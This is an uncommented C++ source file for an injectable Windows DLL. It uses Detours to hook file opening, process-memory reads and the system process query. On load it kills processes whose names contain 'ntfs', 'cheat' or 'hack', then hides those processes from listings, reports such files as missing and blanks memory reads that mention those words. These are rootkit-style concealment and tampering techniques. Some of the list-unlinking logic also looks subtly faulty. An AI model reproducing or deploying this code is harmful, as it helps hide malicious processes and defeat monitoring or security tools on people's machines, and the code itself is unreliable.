#include <windows.h>
#include <detours.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <ntdll.h>

static HANDLE(WINAPI *OriginalCreateFileW)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) = CreateFileW;

static BOOL(WINAPI *OriginalReadProcessMemory)(
    HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*) = ReadProcessMemory;

static NTSTATUS(NTAPI *OriginalNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG) = NtQuerySystemInformation;

static bool g_interceptionSuccess = false;

bool isSuspiciousName(const std::wstring& name) {
    std::wstring nameLower = name;
    std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::towlower);
    return nameLower.find(L"ntfs") != std::wstring::npos ||
           nameLower.find(L"cheat") != std::wstring::npos ||
           nameLower.find(L"hack") != std::wstring::npos;
}

bool killNTFSProcesses() {
    bool processKilled = false;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (isSuspiciousName(pe32.szExeFile)) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    if (TerminateProcess(hProcess, 0)) {
                        processKilled = true;
                        g_interceptionSuccess = true;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processKilled;
}

HANDLE WINAPI HookedCreateFileW(
    LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
    if (isSuspiciousName(lpFileName)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        g_interceptionSuccess = true;
        return INVALID_HANDLE_VALUE;
    }
    return OriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
                              lpSecurityAttributes, dwCreationDisposition,
                              dwFlagsAndAttributes, hTemplateFile);
}

BOOL WINAPI HookedReadProcessMemory(
    HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer,
    SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)
{
    BOOL result = OriginalReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
    if (result && lpNumberOfBytesRead && *lpNumberOfBytesRead > 0) {
        std::string bufferContent(static_cast<char*>(lpBuffer), *lpNumberOfBytesRead);
        std::string bufferLower = bufferContent;
        std::transform(bufferLower.begin(), bufferLower.end(), bufferLower.begin(), ::tolower);
        if (bufferLower.find("cheat") != std::string::npos || 
            bufferLower.find("hack") != std::string::npos ||
            bufferLower.find("ntfs") != std::string::npos) {
            ZeroMemory(lpBuffer, nSize);
            *lpNumberOfBytesRead = nSize;
            g_interceptionSuccess = true;
        }
    }
    return result;
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation,
                                                     SystemInformationLength, ReturnLength);
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        SYSTEM_PROCESS_INFORMATION* processInfo = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
        SYSTEM_PROCESS_INFORMATION* prev = nullptr;
        SYSTEM_PROCESS_INFORMATION* current = processInfo;
        while (current) {
            if (isSuspiciousName(current->ImageName.Buffer)) {
                g_interceptionSuccess = true;
                if (prev) {
                    if (current->NextEntryOffset == 0) {
                        prev->NextEntryOffset = 0;
                    } else {
                        prev->NextEntryOffset += current->NextEntryOffset;
                    }
                } else {
                    if (current->NextEntryOffset == 0) {
                        ZeroMemory(SystemInformation, SystemInformationLength);
                        if (ReturnLength) *ReturnLength = 0;
                    } else {
                        memmove(SystemInformation, (char*)SystemInformation + current->NextEntryOffset,
                                SystemInformationLength - current->NextEntryOffset);
                    }
                }
            }
            prev = current;
            current = current->NextEntryOffset ? (SYSTEM_PROCESS_INFORMATION*)((char*)current + current->NextEntryOffset) : nullptr;
        }
    }
    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        DetourRestoreAfterWith();
        killNTFSProcesses();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalCreateFileW, HookedCreateFileW);
        DetourAttach(&(PVOID&)OriginalReadProcessMemory, HookedReadProcessMemory);
        DetourAttach(&(PVOID&)OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
    } else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalCreateFileW, HookedCreateFileW);
        DetourDetach(&(PVOID&)OriginalReadProcessMemory, HookedReadProcessMemory);
        DetourDetach(&(PVOID&)OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
    }
    return TRUE;
}